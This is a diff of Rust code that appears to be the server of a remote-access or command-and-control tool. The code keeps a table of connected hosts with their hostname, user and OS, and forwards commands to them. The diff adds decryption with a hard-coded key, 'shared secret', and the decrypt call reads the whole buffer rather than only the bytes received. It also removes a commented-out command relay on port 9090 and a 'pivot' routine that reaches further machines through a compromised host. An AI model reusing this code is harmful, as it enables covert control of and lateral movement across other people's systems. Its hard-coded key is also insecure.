@@ -1,6 +1,7 @@
 use std::collections::HashMap;
 use std::fs::File;
 use base64::{Engine as _, engine::general_purpose};
+use simple_crypt::decrypt;
 // use colored::Colorize;
 use std::io::{BufReader, Read, Write};
 use std::sync::Arc;
@@ -177,8 +178,11 @@ pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>, r
         let result = timeout(Duration::from_secs(3), tcp_stream.read(&mut rbuffer)).await;
         match result {
             Ok(Ok(n)) => {
-                let data = String::from_utf8(rbuffer[..n].to_vec()).expect("Error converting to utf-8");
-                let parts: Vec<&str> = data.split("||").collect();
+                // let data = String::from_utf8(rbuffer[..n].to_vec()).expect("Error converting to utf-8");
+                let data = decrypt(&rbuffer, b"shared secret").expect("Failed to decrypt");
+                let data_string = String::from_utf8(data).expect("Failed to convert to String");
+                println!("Received decrypted data: {:?} size {}", data_string, n);
+                let parts: Vec<&str> = data_string.split("||").collect();
                 if parts[1] == "ACSINFO" {
                     return (parts[2].to_string(), parts[3].to_string());
                 } else {
@@ -194,51 +198,6 @@ pub async fn parse_client_info(stream: &mut Arc<Mutex<tokio::net::TcpStream>>, r
         }
     }
 }
-// pub fn handle_guiconnect(active_connections: Arc<Mutex<HashMap<String, ConnectionInfo>>>) -> Result<(), io::Error> {
-//     std::thread::spawn(move || {
-//         let listener = std::net::TcpListener::bind("0.0.0.0:9090").unwrap();
-//         let active_connections = active_connections.clone();
-//         loop {
-//             let (socket, _) = listener.accept().unwrap();
-//             let done = false;
-//             while !done {
-//                 let mut buffer = [0; 1024];
-//                 let bytes_read = match socket.read(&mut buffer) {
-//                     Ok(bytes_read) => bytes_read,
-//                     Err(_) => continue,
-//                 };
-//                 if bytes_read == 0 {
-//                     continue;
-//                 }
-//                 let data = String::from_utf8(buffer[..bytes_read].to_vec()).unwrap();
-//                 let active_connections2 = active_connections.try_lock().unwrap();
-//                 if data.contains("||GRAB_INFO||") {
-//                     let mut info = String::new();
-//                     for (hostname, con) in active_connections2.iter() {
-//                         info.push_str(&format!("{}_{},", hostname, con.id));
-//                     }
-//                     info = format!("\r\n||HOSTINC||{}\r\n", info);
-//                     socket.write(info.as_bytes()).unwrap();
-//                     socket.flush().unwrap();
-//                 } else if data.starts_with("test") {
-//                     socket.write("Test received.\r\n".as_bytes()).unwrap();
-//                 } else if data.starts_with("cmd") {
-//                     let data = data.replace("\r", "").replace("\n", "");
-//                     println!("{}", data);
-//                     let output = handle_command(&active_connections, &data);
-//                     socket.write(output.await.unwrap().as_bytes()).await.unwrap();
-//                 } else if data.starts_with("list") {
-//                     let output = handle_list(&active_connections);
-//                     socket.write(output.as_bytes()).await.unwrap();
-//                 } else {
-//                     let unknowncommand = format!("Unknown command: {}", data);
-//                     socket.write(unknowncommand.as_bytes()).await.unwrap();
-//                 }
-//             }
-//         }
-//     });
-//     Ok(())
-// }
 pub async fn handle_command(
     active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool)
     -> Result<String, String> {
@@ -292,78 +251,6 @@ pub async fn handle_command(
     }
     Ok(cmdout.trim().to_string())
 }
-/*
-pub async fn handle_pivot(
-    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
-    command: &str,
-    raw_connection: bool
-) -> Result<String, String> {
-    if raw_connection {
-        return Err("Pivot command not supported for raw connections".to_string());
-    }
-    let parts: Vec<&str> = command.split(" ").collect();
-    if parts.len() < 3 {
-        return Err("Invalid command, expected 'pivot ID IP PORT'".to_string());
-    }
-    let id: usize = match parts[1].trim().parse() {
-        Ok(num) => num,
-        Err(_) => {
-            return Err("Invalid ID".to_string());
-        }
-    };
-    let active_connections_lock = active_connections.lock().await;
-    if id > active_connections_lock.values().count() {
-        return Err("Invalid ID".to_string());
-    }
-    let pivot_ip = parts[2].trim();
-    let pivot_port = parts[3];
-    let pivot_cmd = "||PIVOT|| ".to_owned() + pivot_ip + " " + &pivot_port;
-    let connection_info = active_connections_lock.values().nth(id - 1).unwrap();
-    let stream = connection_info.stream.clone();
-
-    stream.lock().await.write(pivot_cmd.as_bytes()).await.expect("Error writing to stream");
-    stream.lock().await.flush().await.expect("Error flushing stream");
-
-    let pivot_hostname = format!("{}:{}", pivot_ip, pivot_port);
-    let client_id: usize;
-    if !active_connections_lock.contains_key(&pivot_hostname) {
-        let mut lowest_open_id = 1;
-        while active_connections_lock.values().any(|info| info.id == lowest_open_id) {
-            lowest_open_id += 1;
-        }
-        client_id = lowest_open_id;
-    } else {
-        let connection_info = active_connections_lock.get(&pivot_hostname).unwrap();
-        client_id = connection_info.id;
-    }
-
-    let mut buffer = [0; 1024];
-    let n = match stream.lock().await.read(&mut buffer).await {
-        Ok(n) => n,
-        Err(_) => return Err("Error reading from stream".to_string()),
-    };
-
-    let response = std::str::from_utf8(&buffer[..n]).unwrap();
-    if response.contains("||CONNECTED||") {
-        let pivot_hostname = pivot_hostname.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
-        let output = format!("New client connected: {} (ID {})", pivot_hostname, client_id);
-        let username = "fixthis".to_string();
-        let os = "fixthis".to_string();
-        active_connections.lock().await.insert(
-            pivot_hostname.clone(),
-            ConnectionInfo {
-                id: client_id,
-                stream: stream.clone(),
-                hostname: pivot_hostname.clone(),
-                is_pivot: true,
-                username: username.clone(),
-                os: os.clone(),
-            },
-        );
-        return Ok(output);
-    }
-    Ok(response.to_string())
-} */
 pub async fn handle_list(active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>) -> Vec<String> {
     let mut list = vec![String::new()];
     list.push("Active connections:\n".to_string());
